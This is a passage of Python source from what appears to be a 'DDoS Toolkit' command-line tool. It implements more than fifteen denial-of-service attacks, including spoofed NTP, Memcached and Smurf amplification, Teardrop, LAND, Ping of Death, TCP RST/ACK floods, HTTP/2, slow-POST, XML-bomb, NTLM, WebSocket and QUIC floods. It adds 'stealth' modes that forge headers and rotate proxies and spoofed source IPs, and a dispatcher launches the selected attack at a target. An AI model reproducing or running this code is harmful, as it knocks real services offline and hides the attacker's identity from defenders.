            sock.connect((target_ip, target_port))
            sock.send(os.urandom(random.randint(512, 1024)))
            sock.close()
            
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
        except Exception as e:
            print(f"Error during SSH flood: {e}")
        time.sleep(0.01 if not stealth else 0.1)
    print("SSH flood attack completed.")
    
def ntp_amplification(target_ip: str, duration: int, stealth: bool = False,
                     spoof_ips: Optional[List[str]] = None) -> None:
    """Perform NTP amplification attack with stealth options."""
    print(f"Starting NTP amplification attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
            packet = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip)
            packet = packet / scapy.UDP(dport=123) / scapy.Raw(load=os.urandom(64))
            
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
                
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during NTP amplification: {e}")
        time.sleep(0.01 if not stealth else 0.1)
    print("NTP amplification attack completed.")

def memcached_amplification(target_ip: str, duration: int, stealth: bool = False,
                           spoof_ips: Optional[List[str]] = None) -> None:
    """Perform Memcached amplification attack with stealth options."""
    print(f"Starting Memcached amplification attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
            packet = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip)
            packet = packet / scapy.UDP(dport=11211) / scapy.Raw(load=os.urandom(64))
            
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
                
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during Memcached amplification: {e}")
        time.sleep(0.01 if not stealth else 0.1)
    print("Memcached amplification attack completed.")

def smurf_attack(target_ip: str, duration: int, stealth: bool = False) -> None:
    """Perform Smurf attack with stealth options."""
    print(f"Starting Smurf attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            packet = scapy.IP(src=target_ip, dst="255.255.255.255") / scapy.ICMP()
            
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
                
            scapy.send(packet, verbose=False)
        except Exception as e:
            print(f"Error during Smurf attack: {e}")
        time.sleep(0.01 if not stealth else 0.1)
    print("Smurf attack completed.")

def teardrop_attack(target_ip: str, duration: int, stealth: bool = False) -> None:
    """Perform Teardrop attack with stealth options."""
    print(f"Starting Teardrop attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            packet = scapy.IP(dst=target_ip, flags="MF", frag=0) / scapy.UDP() / ("X" * 64)
            packet2 = scapy.IP(dst=target_ip, flags=0, frag=1) / ("X" * 64)
            
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
                
            scapy.send(packet, verbose=False)
            scapy.send(packet2, verbose=False)
        except Exception as e:
            print(f"Error during Teardrop attack: {e}")
        time.sleep(0.01 if not stealth else 0.1)
    print("Teardrop attack completed.")

async def http2_flood(target_url: str, stop_event: threading.Event, pause_time: float, 
                     rate_limit: int, proxies: Optional[List[str]] = None, 
                     headers: Optional[Dict[str, str]] = None, 
                     payload_type: str = "json", retry: int = 3,
                     stealth: bool = False, jitter: int = 0,
                     obfuscate: bool = False) -> None:
    """Perform HTTP/2 flood attack with stealth options."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"https://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                for attempt in range(retry):
                    try:
                        headers = headers or {"User-Agent": random.choice(USER_AGENTS)}
                        method = random.choice(HTTP_METHODS)
                        payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None

                        # Apply obfuscation if enabled
                        if obfuscate and payload:
                            payload = obfuscate_packet(payload)

                        # Apply stealth options
                        if stealth:
                            headers.update({
                                "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
                                "Connection": "keep-alive",
                                "Accept-Encoding": "gzip, deflate, br"
                            })
                            pause_time = max(pause_time, 0.5)  # Slower in stealth mode

                        # Add jitter if specified
                        if jitter > 0:
                            await asyncio.sleep(get_random_jitter(jitter))

                        proxy = next(proxy_pool) if proxy_pool else None
                        async with session.request(
                            method, target_url, headers=headers, proxy=proxy, data=payload
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                        break
                    except aiohttp.ClientError as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Client error during request (attempt {attempt + 1}): {e}")
                    except Exception as e:
                        with requests_lock:
                            failed_requests += 1
                        logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                await asyncio.sleep(pause_time)

def land_attack(target_ip: str, target_port: int, duration: int, stealth: bool = False) -> None:
    """LAND attack (send packets with source=dest) with stealth options."""
    print(f"Starting LAND attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            packet = scapy.IP(src=target_ip, dst=target_ip) / \
                     scapy.TCP(sport=target_port, dport=target_port, flags="S")
            
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
                
            scapy.send(packet, verbose=False)
        except Exception as e:
            logger.error(f"Error during LAND attack: {e}")
        time.sleep(0.01 if not stealth else 0.1)
    print("LAND attack completed.")

def ping_of_death(target_ip: str, duration: int, stealth: bool = False) -> None:
    """Ping of Death attack with oversized packets and stealth options."""
    print(f"Starting Ping of Death attack on {target_ip} for {duration} seconds...")
    start_time = time.time()
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            packet = scapy.IP(dst=target_ip, flags="MF", frag=0) / \
                     scapy.ICMP() / \
                     ("X" * 65500)
            
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
                
            scapy.send(packet, verbose=False)
        except Exception as e:
            logger.error(f"Error during Ping of Death: {e}")
        time.sleep(0.1 if not stealth else 0.5)
    print("Ping of Death attack completed.")

async def slow_post_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                          rate_limit: int, proxies: Optional[List[str]] = None,
                          stealth: bool = False, jitter: int = 0) -> None:
    """Slow POST attack with chunked transfer encoding and stealth options."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "Transfer-Encoding": "chunked"
    }

    # Apply stealth options
    if stealth:
        headers.update({
            "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
            "Connection": "keep-alive",
            "Accept-Encoding": "gzip, deflate, br"
        })
        pause_time = max(pause_time, 1.0)  # Slower in stealth mode

    async def generate_chunked_data():
        yield b"1\r\na\r\n"
        await asyncio.sleep(10)
        yield b"1\r\nb\r\n"
        await asyncio.sleep(10)
        yield b"0\r\n\r\n"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    # Add jitter if specified
                    if jitter > 0:
                        await asyncio.sleep(get_random_jitter(jitter))

                    proxy = next(proxy_pool) if proxy_pool else None
                    async with session.post(
                        target_url,
                        headers=headers,
                        proxy=proxy,
                        data=generate_chunked_data(),
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as response:
                        with requests_lock:
                            requests_sent += 1
                            if response.status in [200, 201, 204]:
                                successful_requests += 1
                            else:
                                failed_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.error(f"Error during slow POST attack: {e}")
                await asyncio.sleep(pause_time)

async def xml_bomb_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                         rate_limit: int, proxies: Optional[List[str]] = None,
                         stealth: bool = False, jitter: int = 0) -> None:
    """XML Bomb (Billion Laughs) attack with stealth options."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    xml_bomb = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/xml",
        "Accept": "application/xml"
    }

    # Apply stealth options
    if stealth:
        headers.update({
            "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
            "Connection": "keep-alive",
            "Accept-Encoding": "gzip, deflate, br"
        })
        pause_time = max(pause_time, 1.0)  # Slower in stealth mode

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    # Add jitter if specified
                    if jitter > 0:
                        await asyncio.sleep(get_random_jitter(jitter))

                    proxy = next(proxy_pool) if proxy_pool else None
                    async with session.post(
                        target_url,
                        headers=headers,
                        proxy=proxy,
                        data=xml_bomb,
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as response:
                        with requests_lock:
                            requests_sent += 1
                            if response.status in [200, 201, 204]:
                                successful_requests += 1
                            else:
                                failed_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.error(f"Error during XML bomb attack: {e}")
                await asyncio.sleep(pause_time)

async def ntlm_auth_flood(target_url: str, stop_event: threading.Event, pause_time: float, 
                         rate_limit: int, proxies: Optional[List[str]] = None,
                         stealth: bool = False, jitter: int = 0) -> None:
    """NTLM authentication flood attack with stealth options."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Authorization": "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==",
        "Connection": "keep-alive"
    }

    # Apply stealth options
    if stealth:
        headers.update({
            "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
            "Accept-Encoding": "gzip, deflate, br"
        })
        pause_time = max(pause_time, 1.0)  # Slower in stealth mode

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    # Add jitter if specified
                    if jitter > 0:
                        await asyncio.sleep(get_random_jitter(jitter))

                    proxy = next(proxy_pool) if proxy_pool else None
                    async with session.get(
                        target_url,
                        headers=headers,
                        proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as response:
                        with requests_lock:
                            requests_sent += 1
                            if response.status == 401:
                                successful_requests += 1
                            else:
                                failed_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.error(f"Error during NTLM auth flood: {e}")
                await asyncio.sleep(pause_time)

def char_gen_flood(target_ip: str, target_port: int, duration: int, stealth: bool = False) -> None:
    """Character generator protocol flood attack with stealth options."""
    print(f"Starting CHAR-GEN flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(b"\x01", (target_ip, target_port))
                
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
        except Exception as e:
            logger.error(f"Error during CHAR-GEN flood: {e}")
        time.sleep(0.01 if not stealth else 0.1)
    print("CHAR-GEN flood attack completed.")

def rst_flood(target_ip: str, target_port: int, duration: int, stealth: bool = False,
             spoof_ips: Optional[List[str]] = None) -> None:
    """TCP RST flood attack with stealth options."""
    print(f"Starting RST flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
            packet = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip)
            packet = packet / scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="R")
            
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
                
            scapy.send(packet, verbose=False)
        except Exception as e:
            logger.error(f"Error during RST flood: {e}")
        time.sleep(0.01 if not stealth else 0.1)
    print("RST flood attack completed.")

def ack_flood(target_ip: str, target_port: int, duration: int, stealth: bool = False,
             spoof_ips: Optional[List[str]] = None) -> None:
    """TCP ACK flood attack with stealth options."""
    print(f"Starting ACK flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    spoof_ip_pool = cycle(spoof_ips) if spoof_ips else None
    
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            src_ip = next(spoof_ip_pool) if spoof_ip_pool else None
            packet = scapy.IP(dst=target_ip, src=src_ip) if src_ip else scapy.IP(dst=target_ip)
            packet = packet / scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="A")
            
            if stealth:
                time.sleep(random.uniform(0.1, 0.5))  # Slower in stealth mode
                
            scapy.send(packet, verbose=False)
        except Exception as e:
            logger.error(f"Error during ACK flood: {e}")
        time.sleep(0.01 if not stealth else 0.1)
    print("ACK flood attack completed.")

async def http_fragmentation_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                                  rate_limit: int, proxies: Optional[List[str]] = None,
                                  stealth: bool = False, jitter: int = 0) -> None:
    """HTTP packet fragmentation attack with stealth options."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "keep-alive"
    }

    # Apply stealth options
    if stealth:
        headers.update({
            "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
            "Accept-Encoding": "gzip, deflate, br"
        })
        pause_time = max(pause_time, 1.0)  # Slower in stealth mode

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    # Add jitter if specified
                    if jitter > 0:
                        await asyncio.sleep(get_random_jitter(jitter))

                    proxy = next(proxy_pool) if proxy_pool else None
                    connector = aiohttp.TCPConnector(force_close=True)
                    async with aiohttp.ClientSession(connector=connector) as partial_session:
                        async with partial_session.get(
                            target_url,
                            headers=headers,
                            proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.error(f"Error during HTTP fragmentation attack: {e}")
                await asyncio.sleep(pause_time)

async def ws_dos_attack(target_url: str, stop_event: threading.Event, pause_time: float, 
                       rate_limit: int, proxies: Optional[List[str]] = None,
                       stealth: bool = False, jitter: int = 0) -> None:
    """WebSocket denial of service attack with stealth options."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("ws://", "wss://", "http://", "https://")):
        target_url = f"ws://{target_url}"

    # Apply stealth options
    if stealth:
        pause_time = max(pause_time, 1.0)  # Slower in stealth mode

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    # Add jitter if specified
                    if jitter > 0:
                        await asyncio.sleep(get_random_jitter(jitter))

                    proxy = next(proxy_pool) if proxy_pool else None
                    async with session.ws_connect(
                        target_url,
                        proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as ws:
                        for i in range(1000):
                            await ws.send_str("A" * 1024)
                            await asyncio.sleep(0.1)
                        with requests_lock:
                            requests_sent += 1
                            successful_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.error(f"Error during WebSocket DoS: {e}")
                await asyncio.sleep(pause_time)

async def quic_flood(target_url: str, stop_event: threading.Event, pause_time: float, 
                    rate_limit: int, proxies: Optional[List[str]] = None,
                    stealth: bool = False, jitter: int = 0) -> None:
    """QUIC protocol flood attack with stealth options."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("https://")):
        target_url = f"https://{target_url}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

    # Apply stealth options
    if stealth:
        headers.update({
            "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4)),
            "Accept-Encoding": "gzip, deflate, br"
        })
        pause_time = max(pause_time, 1.0)  # Slower in stealth mode

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    # Add jitter if specified
                    if jitter > 0:
                        await asyncio.sleep(get_random_jitter(jitter))

                    proxy = next(proxy_pool) if proxy_pool else None
                    connector = aiohttp.TCPConnector(force_close=True, enable_cleanup_closed=True)
                    async with aiohttp.ClientSession(connector=connector) as quic_session:
                        async with quic_session.get(
                            target_url,
                            headers=headers,
                            proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.error(f"Error during QUIC flood: {e}")
                await asyncio.sleep(pause_time)

def display_status(stop_event: threading.Event, duration: int, results_file: Optional[str] = None) -> None:
    """Display real-time attack statistics and save results."""
    start_time = time.time()
    results = []
    with tqdm(total=duration, desc="Progress") as pbar:
        while not stop_event.is_set():
            elapsed = time.time() - start_time
            if elapsed >= duration:
                break
            with requests_lock:
                current_time = time.time()
                rps = requests_sent / max(1, current_time - start_time)
                rps_history.append(rps)
                stats = {
                    "Time": elapsed,
                    "Requests Sent": requests_sent,
                    "Successful Requests": successful_requests,
                    "Failed Requests": failed_requests,
                    "RPS": rps,
                    "CPU Usage": psutil.cpu_percent(),
                    "Memory Usage": psutil.virtual_memory().percent,
                    "Network Usage": psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv,
                }
                results.append(stats)
                print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f} | CPU: {stats['CPU Usage']}% | Memory: {stats['Memory Usage']}% | Network: {stats['Network Usage']} bytes{RESET}")
            pbar.update(1)
            time.sleep(1)

    if results_file:
        with open(results_file, "w") as f:
            json.dump(results, f, indent=4)
        print(f"Results saved to {results_file}")

def simple_status(attack_name: str, target: str, duration: int) -> None:
    """Display simple status for non-HTTP attacks."""
    print(f"{GREEN}Starting {attack_name} on {target} for {duration} seconds...{RESET}")
    start_time = time.time()
    while time.time() - start_time < duration and not stop_event.is_set():
        time.sleep(1)
    print(f"{GREEN}{attack_name} completed.{RESET}")

def calculate_rps_stats() -> Dict[str, float]:
    """Calculate requests-per-second statistics."""
    if not rps_history:
        return {"min": 0, "max": 0, "avg": 0}
    return {
        "min": min(rps_history),
        "max": max(rps_history),
        "avg": sum(rps_history) / len(rps_history),
    }

def signal_handler(sig, frame) -> None:
    """Handle interrupt signals for graceful shutdown."""
    global stop_event
    logging.info(f"{RED}\nInterrupted by user. Exiting gracefully...{RESET}")
    stop_event.set()
    sys.exit(0)

async def main() -> None:
    """Main function to coordinate attack execution."""
    args = parse_args()

    if args.help or len(sys.argv) == 1:
        display_help()
        sys.exit(0)

    if args.version:
        print(f"DDoS Toolkit version 1.0#Stable | Platform: x86_64-pc-linux-gnu | License: MIT")
        sys.exit(0)

    display_banner()

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    if args.interactive:
        print(f"{YELLOW}Interactive mode not yet implemented. Using command-line arguments.{RESET}")

    if args.threads <= 0 or args.pause <= 0 or args.duration <= 0 or args.rate_limit <= 0:
        print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
        exit(1)

    proxies = load_proxies(args.proxies) if args.proxies else []
    if proxies:
        proxies = validate_proxies(proxies)
        asyncio.create_task(monitor_proxy_health(proxies))

    spoof_ips = load_spoof_ips(args.spoof_ips) if args.spoof_ips else None

    target = args.url.split("//")[-1].split("/")[0] if args.url else None

    if args.scan and target:
        target_ip = await resolve_target(target)
        if target_ip:
            run_network_scanner(target_ip)
        else:
            print(f"{RED}Exiting: Target is not reachable.{RESET}")
        exit(0)

    if args.wifi_deauth:
        wifi_deauth("wlan0")
        exit(0)

    if args.anonymizer:
        run_anonymizer(args.anonymizer)
        exit(0)

    if not args.url and not args.interactive:
        print(f"{RED}Error: Target URL is required for attack modes.{RESET}")
        display_help()
        exit(1)

    stop_event = threading.Event()
    tasks = []

    # Determine if we should use detailed status or simple status
    use_detailed_status = args.attack_mode in ["http-flood", "slowloris", "http2-flood", 
                                             "slow-post", "xml-bomb", "ntlm-auth-flood",
                                             "http-fragmentation", "ws-dos", "quic-flood"]

    # Attack mode selection
    if args.attack_mode == "char-gen":
        target_ip = await resolve_target(target)
        target_port = args.port or 19
        threading.Thread(target=char_gen_flood, args=(target_ip, target_port, args.duration, args.stealth)).start()
        threading.Thread(target=simple_status, args=("CHAR-GEN flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "rst-flood":
        target_ip = await resolve_target(target)
        target_port = args.port or 80
        threading.Thread(target=rst_flood, args=(target_ip, target_port, args.duration, args.stealth, spoof_ips)).start()
        threading.Thread(target=simple_status, args=("RST flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "ack-flood":
        target_ip = await resolve_target(target)
        target_port = args.port or 80
        threading.Thread(target=ack_flood, args=(target_ip, target_port, args.duration, args.stealth, spoof_ips)).start()
        threading.Thread(target=simple_status, args=("ACK flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "http-fragmentation":
        for _ in range(args.threads):
            task = asyncio.create_task(http_fragmentation_attack(
                args.url, stop_event, args.pause, args.rate_limit, proxies,
                args.stealth, args.jitter
            ))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "ws-dos":
        for _ in range(args.threads):
            task = asyncio.create_task(ws_dos_attack(
                args.url, stop_event, args.pause, args.rate_limit, proxies,
                args.stealth, args.jitter
            ))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "quic-flood":
        for _ in range(args.threads):
            task = asyncio.create_task(quic_flood(
                args.url, stop_event, args.pause, args.rate_limit, proxies,
                args.stealth, args.jitter
            ))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "land-attack":
        target_ip = await resolve_target(target)
        target_port = args.port or 80
        threading.Thread(target=land_attack, args=(target_ip, target_port, args.duration, args.stealth)).start()
        threading.Thread(target=simple_status, args=("LAND attack", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "ping-of-death":
        target_ip = await resolve_target(target)
        threading.Thread(target=ping_of_death, args=(target_ip, args.duration, args.stealth)).start()
        threading.Thread(target=simple_status, args=("Ping of Death", target_ip, args.duration)).start()
    elif args.attack_mode == "slow-post":
        for _ in range(args.threads):
            task = asyncio.create_task(slow_post_attack(
                args.url, stop_event, args.pause, args.rate_limit, proxies,
                args.stealth, args.jitter
            ))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "xml-bomb":
        for _ in range(args.threads):
            task = asyncio.create_task(xml_bomb_attack(
                args.url, stop_event, args.pause, args.rate_limit, proxies,
                args.stealth, args.jitter
            ))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "ntlm-auth-flood":
        for _ in range(args.threads):
            task = asyncio.create_task(ntlm_auth_flood(
                args.url, stop_event, args.pause, args.rate_limit, proxies,
                args.stealth, args.jitter
            ))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "syn-flood":
        target_ip = await resolve_target(target)
        target_port = args.port or 80
        threading.Thread(target=syn_flood, args=(target_ip, target_port, args.duration, args.stealth, args.random_ports, spoof_ips)).start()
        threading.Thread(target=simple_status, args=("SYN flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "http-flood":
        for _ in range(args.threads):
            task = asyncio.create_task(rate_limited_attack(
                args.url, stop_event, args.pause, args.rate_limit, proxies,
                None, "json", 3, args.stealth, args.jitter, args.obfuscate, spoof_ips
            ))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "slowloris":
        for _ in range(args.threads):
            task = asyncio.create_task(slowloris_attack(
                args.url, stop_event, args.pause, args.rate_limit, proxies,
                None, 3, args.stealth, args.jitter
            ))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "udp-flood":
        target_ip = await resolve_target(target)
        target_port = args.port or 80
        threading.Thread(target=udp_flood, args=(target_ip, target_port, args.duration, args.stealth)).start()
        threading.Thread(target=simple_status, args=("UDP flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "icmp-flood":
        target_ip = await resolve_target(target)
        threading.Thread(target=icmp_flood, args=(target_ip, args.duration, args.stealth, spoof_ips)).start()
        threading.Thread(target=simple_status, args=("ICMP flood", target_ip, args.duration)).start()
    elif args.attack_mode == "dns-amplification":
        target_ip = await resolve_target(target)
        threading.Thread(target=dns_amplification, args=(target_ip, args.duration, args.stealth, spoof_ips)).start()
        threading.Thread(target=simple_status, args=("DNS amplification", target_ip, args.duration)).start()
    elif args.attack_mode == "ftp-flood":
        target_ip = await resolve_target(target)
        target_port = args.port or 21
        threading.Thread(target=ftp_flood, args=(target_ip, target_port, args.duration, args.stealth)).start()
        threading.Thread(target=simple_status, args=("FTP flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "ssh-flood":
        target_ip = await resolve_target(target)
        target_port = args.port or 22
        threading.Thread(target=ssh_flood, args=(target_ip, target_port, args.duration, args.stealth)).start()
        threading.Thread(target=simple_status, args=("SSH flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "ntp-amplification":
        target_ip = await resolve_target(target)
        threading.Thread(target=ntp_amplification, args=(target_ip, args.duration, args.stealth, spoof_ips)).start()
        threading.Thread(target=simple_status, args=("NTP amplification", target_ip, args.duration)).start()
    elif args.attack_mode == "memcached-amplification":
        target_ip = await resolve_target(target)
        threading.Thread(target=memcached_amplification, args=(target_ip, args.duration, args.stealth, spoof_ips)).start()
        threading.Thread(target=simple_status, args=("Memcached amplification", target_ip, args.duration)).start()
    elif args.attack_mode == "smurf":
        target_ip = await resolve_target(target)
        threading.Thread(target=smurf_attack, args=(target_ip, args.duration, args.stealth)).start()
        threading.Thread(target=simple_status, args=("Smurf attack", target_ip, args.duration)).start()
    elif args.attack_mode == "teardrop":
        target_ip = await resolve_target(target)
        threading.Thread(target=teardrop_attack, args=(target_ip, args.duration, args.stealth)).start()
        threading.Thread(target=simple_status, args=("Teardrop attack", target_ip, args.duration)).start()
    elif args.attack_mode == "http2-flood":
        for _ in range(args.threads):
            task = asyncio.create_task(http2_flood(
                args.url, stop_event, args.pause, args.rate_limit, proxies,
                None, "json", 3, args.stealth, args.jitter, args.obfuscate
            ))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()

    await asyncio.sleep(args.duration)
    stop_event.set()

    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

    if use_detailed_status:
        stats = calculate_rps_stats()
